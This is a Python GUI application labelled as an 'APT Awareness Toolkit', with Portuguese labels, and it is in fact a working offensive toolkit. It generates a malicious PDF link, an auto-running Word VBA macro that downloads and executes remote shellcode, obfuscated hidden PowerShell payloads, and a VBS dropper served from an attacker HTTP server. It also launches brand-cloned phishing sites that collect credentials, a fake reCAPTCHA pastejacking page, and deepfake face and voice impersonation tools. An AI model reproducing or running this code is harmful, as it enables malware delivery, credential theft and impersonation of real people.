from PySide2.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QLabel,
    QComboBox, QPushButton, QLineEdit, QTextEdit, QMessageBox, QCheckBox, QFileDialog
)

from PySide2.QtGui import QPalette, QColor
from PySide2.QtCore import Qt
from PySide2.QtCore import QTimer
import sys
import os

class DarkThemeApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.face_image_path = ""
        self.target_video_path = ""
        self.setWindowTitle("APT Awareness Toolkit")
        self.setGeometry(100, 100, 1000, 700)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.create_tabs()
        self.set_dark_theme()

    def create_tabs(self):
        self.artifacts_tab = QWidget()
        self.phishing_tab = QWidget()
        self.deepfake_tab = QWidget()
        self.c2_tab = QWidget()
        self.apt_tab = QWidget()

        self.tabs.addTab(self.artifacts_tab, "Gerar Artefatos Maliciosos")
        self.tabs.addTab(self.phishing_tab, "Phishing & Spear-Phishing")
        self.tabs.addTab(self.deepfake_tab, "Deepfake & Deepvoice Awareness")
        self.tabs.addTab(self.c2_tab, "C2 Simulado")
        self.tabs.addTab(self.apt_tab, "Templates APT")

        # Abas ainda vazias
        for tab in [self.c2_tab, self.apt_tab]:
            layout = QVBoxLayout()
            layout.addWidget(QLabel("Em breve..."))
            tab.setLayout(layout)

        # --- Aba Gerar Artefatos Maliciosos ---
        layout = QVBoxLayout()

        # PDF Malicioso
        layout.addWidget(QLabel("Adicione a URL para PDF Malicioso:"))
        self.pdf_input = QTextEdit()
        layout.addWidget(self.pdf_input)
        self.pdf_btn = QPushButton("Gerar PDF")
        self.pdf_btn.clicked.connect(self.generate_pdf)
        layout.addWidget(self.pdf_btn)

        # Macro Word
        layout.addWidget(QLabel("Código VBA para Macro Word:"))
        self.macro_input = QTextEdit()
        layout.addWidget(self.macro_input)
        self.macro_btn = QPushButton("Gerar DOCX com Macro")
        self.fill_macro_btn = QPushButton("Preencher Macro Padrão")
        self.fill_macro_btn.clicked.connect(self.fill_macro_template)
        layout.addWidget(self.fill_macro_btn)
        self.macro_btn.clicked.connect(self.generate_macro)
        layout.addWidget(self.macro_btn)

        # PowerShell com opções de evasão
        layout.addWidget(QLabel("Payload PowerShell:"))
        self.ps_input = QTextEdit()
        layout.addWidget(self.ps_input)

        self.ps_base64_checkbox = QCheckBox("Codificar em Base64")
        self.ps_varsub_checkbox = QCheckBox("Substituição de Variáveis")
        self.ps_concat_checkbox = QCheckBox("Concatenação de Strings")
        self.ps_iex_checkbox = QCheckBox("Usar IEX")
        self.ps_compress_checkbox = QCheckBox("Compressão + Descompressão")

        layout.addWidget(self.ps_base64_checkbox)
        layout.addWidget(self.ps_varsub_checkbox)
        layout.addWidget(self.ps_concat_checkbox)
        layout.addWidget(self.ps_iex_checkbox)
        layout.addWidget(self.ps_compress_checkbox)

        self.ps_btn = QPushButton("Gerar PS1")
        self.ps_btn.clicked.connect(self.generate_ps1)
        layout.addWidget(self.ps_btn)

        # VBS com shellcode remoto
        self.vbs_remote_btn = QPushButton("Gerar VBS Remoto + Iniciar Servidor")
        self.vbs_remote_btn.clicked.connect(self.generate_vbs_remote)
        layout.addWidget(self.vbs_remote_btn)

        self.artifacts_tab.setLayout(layout)

        # Layout para aba de Phishing & Spear-Phishing
        phishing_layout = QVBoxLayout()

        # Phishing pronto
        self.site_selector = QComboBox()
        self.site_selector.addItems([
            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Steam", "Twitter", "Playstation",
            "Tiktok", "Mediafire", "Twitch", "Pinterest", "Snapchat", "Linkedin", "Ebay", "Quora", "Protonmail",
            "Spotify", "Reddit", "Adobe", "Gitlab", "DeviantArt", "Badoo", "Origin", "DropBox", "Yahoo",
            "Wordpress", "Yandex", "StackoverFlow", "Vk", "XBOX", "Github"
        ])
        phishing_layout.addWidget(self.site_selector)

        self.launch_phish_btn = QPushButton("Iniciar Site de Phishing")
        self.launch_phish_btn.clicked.connect(self.start_phish_server)
        phishing_layout.addWidget(self.launch_phish_btn)

        self.phish_url_label = QLabel("URL do phishing aparecerá aqui...")
        phishing_layout.addWidget(self.phish_url_label)

        phishing_layout.addWidget(QLabel("Credenciais Coletadas:"))
        self.creds_output = QTextEdit()
        self.creds_output.setReadOnly(True)
        phishing_layout.addWidget(self.creds_output)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Recaptcha Falso (Pastejack) ---
        phishing_layout.addWidget(QLabel("Geração de Recaptcha Falso com CTRL+C Automático:"))
        self.recaptcha_btn = QPushButton("Gerar Recaptcha Falso")
        self.recaptcha_btn.clicked.connect(self.generate_fake_recaptcha)
        phishing_layout.addWidget(self.recaptcha_btn)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Aba Deepfake & Deepvoice Awareness ---
        deepfake_layout = QVBoxLayout()

        # Deepfake de vídeo
        deepfake_layout.addWidget(QLabel("Geração de Vídeo com Troca de Rosto (Deepfake):"))

        self.source_img_btn = QPushButton("Selecionar Imagem de Rosto (Fonte)")
        self.source_img_btn.clicked.connect(self.select_face_image)
        deepfake_layout.addWidget(self.source_img_btn)

        self.target_video_btn = QPushButton("Selecionar Vídeo com Rosto (Alvo)")
        self.target_video_btn.clicked.connect(self.select_target_video)
        deepfake_layout.addWidget(self.target_video_btn)

        self.run_deepfake_btn = QPushButton("Iniciar Deepfake com FaceFusion")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("Nenhum deepfake gerado ainda.")
        deepfake_layout.addWidget(self.deepfake_status)

        self.run_deepfake_btn = QPushButton("Iniciar Deepfake")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("Nenhum vídeo processado ainda.")
        deepfake_layout.addWidget(self.deepfake_status)

        # Deep Voice
        deepfake_layout.addWidget(QLabel("Geração de Voz Clonada (DeepVoice):"))
        self.voice_input = QTextEdit()
        deepfake_layout.addWidget(self.voice_input)

        self.voice_selector = QComboBox()
        self.voice_selector.addItems(["Obama", "Elon Musk", "Genérica", "Treinada"])
        deepfake_layout.addWidget(self.voice_selector)

        self.voice_btn = QPushButton("Gerar Voz Clonada")
        self.voice_btn.clicked.connect(self.generate_deepvoice_audio)
        deepfake_layout.addWidget(self.voice_btn)

        self.deepvoice_status = QLabel("Nenhum áudio gerado ainda.")
        deepfake_layout.addWidget(self.deepvoice_status)

        self.deepfake_tab.setLayout(deepfake_layout)


    def set_dark_theme(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(30, 30, 30))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(25, 25, 25))
        palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(45, 45, 45))
        palette.setColor(QPalette.ButtonText, Qt.white)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Link, QColor(42, 130, 218))
        palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)

    # Placeholders para os botões — você insere os códigos quando quiser
    def generate_pdf(self):
        host = self.pdf_input.toPlainText().strip()
        if not host:
            QMessageBox.warning(self, "Erro", "Insira a URL para o PDF malicioso.")
            return

        try:
            filename = "badphish.pdf"
            with open(filename, "w") as file:
                file.write('%PDF-1.7\n\n')
                file.write('1 0 obj\n')
                file.write('  << /Type /Catalog\n')
                file.write('     /Pages 2 0 R\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('2 0 obj\n')
                file.write('  << /Type /Pages\n')
                file.write('     /Kids [3 0 R]\n')
                file.write('     /Count 1\n')
                file.write('     /MediaBox [0 0 595 842]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('3 0 obj\n')
                file.write('  << /Type /Page\n')
                file.write('     /Parent 2 0 R\n')
                file.write('     /Resources\n')
                file.write('      << /Font\n')
                file.write('          << /F1\n')
                file.write('              << /Type /Font\n')
                file.write('                 /Subtype /Type1\n')
                file.write('                 /BaseFont /Courier\n')
                file.write('              >>\n')
                file.write('          >>\n')
                file.write('      >>\n')
                file.write('     /Annots [<< /Type /Annot\n')
                file.write('                 /Subtype /Link\n')
                file.write('                 /Open true\n')
                file.write('                 /A 5 0 R\n')
                file.write('                 /H /N\n')
                file.write('                 /Rect [0 0 595 842]\n')
                file.write('              >>]\n')
                file.write('     /Contents [4 0 R]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('4 0 obj\n')
                file.write('  << /Length 67 >>\n')
                file.write('stream\n')
                file.write('  BT\n')
                file.write('    /F1 22 Tf\n')
                file.write('    30 800 Td\n')
                file.write('    (PDF Blocked: \'Click Here\') Tj\n')
                file.write('  ET\n')
                file.write('endstream\n')
                file.write('endobj\n\n')
                file.write('5 0 obj\n')
                file.write('  << /Type /Action\n')
                file.write('     /S /URI\n')
                file.write('     /URI (' + host + '/)\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('xref\n')
                file.write('0 6\n')
                file.write('0000000000 65535 f\n')
                file.write('0000000010 00000 n\n')
                file.write('0000000069 00000 n\n')
                file.write('0000000170 00000 n\n')
                file.write('0000000629 00000 n\n')
                file.write('0000000749 00000 n\n')
                file.write('trailer\n')
                file.write('  << /Root 1 0 R\n')
                file.write('     /Size 6\n')
                file.write('  >>\n')
                file.write('startxref\n')
                file.write('854\n')
                file.write('%%EOF\n')

            QMessageBox.information(self, "Sucesso", f"PDF malicioso salvo como {filename}!")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar PDF:\n{str(e)}")

    def fill_macro_template(self):
        from PySide2.QtWidgets import QInputDialog

        url, ok1 = QInputDialog.getText(self, "URL do Shellcode", "Insira a URL do shellcode:")
        if not ok1 or not url:
            return

        path, ok2 = QInputDialog.getText(self, "Caminho para salvar", "Insira o caminho (ex: C:\\Users\\Public\\shellcode.bin):")
        if not ok2 or not path:
            return

        vba_code = f'''Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As LongPtr, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim shellcodePath As String
    shellcodePath = "{path}"
    
    If DownloadFile("{url}/shellcode.bin", shellcodePath) Then
        ExecuteShellcode shellcodePath
    End If
End Sub

Function DownloadFile(URL As String, filePath As String) As Boolean
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile filePath, 2
        objADOStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If

    On Error GoTo 0
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
End Function

Sub ExecuteShellcode(filePath As String)
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile(filePath)
    
    If UBound(sc) < 0 Then Exit Sub
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    
    RtlMoveMemory addr, sc(0), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    If Dir(filePath) = "" Then Exit Function
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    
    If fileSize = 0 Then
        Close #fileNum
        Exit Function
    End If
    
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function'''

        self.macro_input.setPlainText(vba_code)
        QMessageBox.information(self, "Macro Padrão", "Código VBA preenchido com sucesso!")

    def generate_macro(self):
        content = self.macro_input.toPlainText().strip()

        if not content:
            QMessageBox.warning(self, "Aviso", "O campo da macro está vazio.")
            return

        try:
            filename = "macro_payload.vba"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)

            QMessageBox.information(self, "Macro", f"Documento VBA salvo como '{filename}'.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Ocorreu um erro ao salvar o arquivo:\n{str(e)}")


    def generate_ps1(self):
        import zlib
        import base64
        import random
        import string

        raw_code = self.ps_input.toPlainText().strip()
        use_b64 = self.ps_base64_checkbox.isChecked()
        use_vars = self.ps_varsub_checkbox.isChecked()
        use_concat = self.ps_concat_checkbox.isChecked()
        use_iex = self.ps_iex_checkbox.isChecked()
        use_compress = self.ps_compress_checkbox.isChecked()

        if not raw_code:
            QMessageBox.warning(self, "Aviso", "Insira um script PowerShell.")
            return

        try:
            result = raw_code

            # Substituição de variáveis
            if use_vars:
                var_name = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"${var_name} = \"{result}\"\n"

                if use_iex:
                    result += f"IEX (${var_name})"
                else:
                    result += f"Invoke-Expression (${var_name})"

            # Concatenação de strings
            if use_concat:
                chunks = [f'"{c}"' for c in raw_code]
                joined = '+'.join(chunks)
                result = f"$cmd = {joined}\n"
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Compressão e descompressão
            if use_compress:
                compressed = zlib.compress(raw_code.encode("utf-8"))
                compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                rand1 = ''.join(random.choices(string.ascii_letters, k=8))
                rand2 = ''.join(random.choices(string.ascii_letters, k=8))
                rand3 = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"""
${rand1} = "{compressed_b64}"
${rand2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${rand1}))
${rand3} = New-Object IO.Compression.DeflateStream(${rand2}, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader(${rand3}, [Text.Encoding]::UTF8)
$cmd = $reader.ReadToEnd()
"""
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Base64 final
            if use_b64:
                encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

            # Salvar
            with open("payload_obfuscated.ps1", "w", encoding="utf-8") as f:
                f.write(result)

            QMessageBox.information(self, "Sucesso", "Script PowerShell salvo como 'payload_obfuscated.ps1'.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar PS1:\n{str(e)}")



    def generate_vbs_remote(self):
        import http.server
        import socketserver
        import threading
        import shutil
        from PySide2.QtWidgets import QInputDialog

        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Shellcode (.bin)", "", "BIN Files (*.bin)")
        if not path:
            return

        # Pede IP e Porta
        ip, ok1 = QInputDialog.getText(self, "IP para download", "Digite o IP que será usado no VBS (ex: 192.168.1.10):")
        if not ok1 or not ip:
            return

        port, ok2 = QInputDialog.getText(self, "Porta do servidor", "Digite a porta do servidor HTTP (ex: 8000):")
        if not ok2 or not port.isdigit():
            return
        port = int(port)

        try:
            # Copia shellcode.bin para pasta de saída
            os.makedirs("outputs", exist_ok=True)
            bin_dest = os.path.join("outputs", "shellcode.bin")
            shutil.copy(path, bin_dest)

            # Cria VBS dropper
            vbs_code = f"""Set xHttp = CreateObject("MSXML2.XMLHTTP")
xHttp.Open "GET", "http://{ip}:{port}/shellcode.bin", False
xHttp.Send

If xHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xHttp.ResponseBody
    stream.SaveToFile "C:\\Users\\Public\\shellcode.bin", 2
    stream.Close
End If
"""

            vbs_path = os.path.join("outputs", "dropper.vbs")
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs_code)

            # Inicia o servidor embutido para servir o .bin
            def start_server():
                os.chdir("outputs")
                handler = http.server.SimpleHTTPRequestHandler
                with socketserver.TCPServer(("", port), handler) as httpd:
                    print(f"[*] Servidor HTTP iniciado em http://0.0.0.0:{port}")
                    httpd.serve_forever()

            thread = threading.Thread(target=start_server, daemon=True)
            thread.start()

            QMessageBox.information(self, "Sucesso", f"VBS gerado como 'dropper.vbs' e servidor HTTP ativo na porta {port}.")

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao gerar VBS remoto:\n{str(e)}")


    def start_phish_server(self):
        import os
        import subprocess
        import random
        import threading
        import time

        site_name = self.site_selector.currentText().lower()
        site_path = os.path.join(".sites", site_name)

        if not os.path.exists(site_path):
            QMessageBox.critical(self, "Erro", f"O template .sites/{site_name} não foi encontrado.")
            return

        port = random.randint(8000, 8999)

        try:
            # Inicia o servidor PHP
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=site_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            self.phish_url_label.setText(f"<b>Servidor ativo (PHP):</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

            # Inicia monitoramento do usernames.txt
        
        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Falha ao iniciar servidor PHP:\n{str(e)}")
        self.cred_path = os.path.join(site_path, "usernames.txt")
        self.last_creds = ""
        self.timer = QTimer()
        self.timer.timeout.connect(self.check_credentials_file)
        self.timer.start(2000)  # a cada 2 segundos

    def check_credentials_file(self):
        if os.path.exists(self.cred_path):
            with open(self.cred_path, "r", encoding="utf-8") as f:
                content = f.read()
            if content != self.last_creds:
                self.creds_output.setPlainText(content)
                self.last_creds = content


    def generate_fake_recaptcha(self):
        import os
        import re
        import random
        import subprocess
        from PySide2.QtWidgets import QInputDialog, QMessageBox

        base_path = ".fake-recaptcha"
        js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
        html_path = os.path.join(base_path, "index.html")

        if not os.path.exists(js_path) or not os.path.exists(html_path):
            QMessageBox.critical(self, "Erro", f"Arquivos não encontrados na pasta '.fake-recaptcha'.")
            return

        # Input do payload
        payload, ok = QInputDialog.getMultiLineText(self, "Payload", "Insira o payload a ser copiado:")
        if not ok or not payload.strip():
            return
        payload = payload.strip().replace('"', '\\"')

        # Seleção de sistema operacional
        sistemas = ["Windows", "Linux", "macOS"]
        sistema, ok = QInputDialog.getItem(self, "Sistema Alvo", "Selecione o sistema alvo:", sistemas, editable=False)
        if not ok or not sistema:
            return

        try:
            # Atualiza a variável const payload no JavaScript
            with open(js_path, "r", encoding="utf-8") as f:
                js_content = f.read()

            new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload}`;', js_content, flags=re.DOTALL)

            with open(js_path, "w", encoding="utf-8") as f:
                f.write(new_js)

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao modificar JS:\n{str(e)}")
            return

        try:
            # Atualiza o index.html com localStorage.setItem('os', ...)
            with open(html_path, "r", encoding="utf-8") as f:
                html = f.read()

            if "localStorage.setItem" not in html:
                html = html.replace(
                    '<script src="src/fakerecaptcha.js"></script>',
                    f'<script>localStorage.setItem("os", "{sistema.lower()}");</script>\n<script src="src/fakerecaptcha.js"></script>'
                )
            else:
                html = re.sub(r'localStorage\.setItem\("os", "[^"]*"\);',
                            f'localStorage.setItem("os", "{sistema.lower()}");', html)

            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html)

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao modificar HTML:\n{str(e)}")
            return

        # Inicia servidor PHP
        try:
            port = random.randint(8100, 8999)
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=base_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            QMessageBox.information(self, "Recaptcha Falso", f"Servidor iniciado em:\n{url}")
            self.phish_url_label.setText(f"<b>Recaptcha Falso:</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

        except Exception as e:
            QMessageBox.critical(self, "Erro", f"Erro ao iniciar servidor PHP:\n{str(e)}")


    def generate_deepvoice_audio(self):
        import asyncio
        import threading

        text = self.voice_input.toPlainText().strip()
        voice = self.voice_selector.currentText()

        voice_map = {
            "Obama": "en-US-GuyNeural",
            "Elon Musk": "en-US-AriaNeural",
            "Genérica": "en-US-JennyNeural",
            "Treinada": "en-GB-RyanNeural"
        }
        selected_voice = voice_map.get(voice, "en-US-GuyNeural")

        if not text:
            QMessageBox.warning(self, "Aviso", "Digite um texto para gerar a voz.")
            return

        def run_voice():
            asyncio.run(generate_cloned_voice(text, selected_voice))
            self.deepvoice_status.setText("✅ Voz gerada com sucesso: cloned_voice.mp3")

        threading.Thread(target=run_voice).start()


    def select_face_image(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Imagem de Rosto", "", "Imagens (*.jpg *.jpeg *.png)")
        if path:
            self.face_image_path = path
            QMessageBox.information(self, "Imagem Selecionada", f"Imagem de rosto carregada:\n{path}")

    def select_target_video(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Selecionar Vídeo com Rosto", "", "Vídeos (*.mp4 *.avi *.mov)")
        if path:
            self.target_video_path = path
            QMessageBox.information(self, "Vídeo Selecionado", f"Vídeo alvo carregado:\n{path}")

    def run_deepfake_generator(self):
        import subprocess
        import threading

        if not self.face_image_path or not self.target_video_path:
            QMessageBox.warning(self, "Erro", "Selecione uma imagem de rosto e um vídeo alvo.")
            return

        def execute():
            try:
                output_path = "deepfake_output.mp4"
                command = [
                    "facefusion",
                    "--source", self.face_image_path,
                    "--target", self.target_video_path,
                    "--output", output_path,
                    "--skip-download"  # se já tiver modelos baixados
                ]
                result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if result.returncode == 0:
                    self.deepfake_status.setText(f"✅ Deepfake gerado com sucesso: {output_path}")
                else:
                    self.deepfake_status.setText(f"❌ Erro ao gerar deepfake:\n{result.stderr}")

            except Exception as e:
                self.deepfake_status.setText(f"Erro inesperado: {str(e)}")

        threading.Thread(target=execute, daemon=True).start()



import asyncio
import edge_tts

async def generate_cloned_voice(text, voice="en-US-GuyNeural", output_file="cloned_voice.mp3"):
    communicate = edge_tts.Communicate(text, voice)
    await communicate.save(output_file)
    return output_file

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = DarkThemeApp()
    window.show()
    sys.exit(app.exec_())
